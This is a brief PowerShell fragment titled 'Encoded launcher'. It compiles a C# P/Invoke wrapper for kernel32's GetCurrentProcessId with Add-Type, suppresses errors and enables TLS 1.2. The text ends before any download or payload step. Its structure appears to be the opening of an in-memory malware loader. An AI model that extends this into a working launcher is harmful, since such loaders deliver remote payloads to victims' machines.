# Encoded launcher
Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public static class Win32Api { [DllImport("kernel32.dll")] public static extern uint GetCurrentProcessId(); }' -Language CSharp -ErrorAction SilentlyContinue
$FetchResult = [Win32Api]::GetCurrentProcessId()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
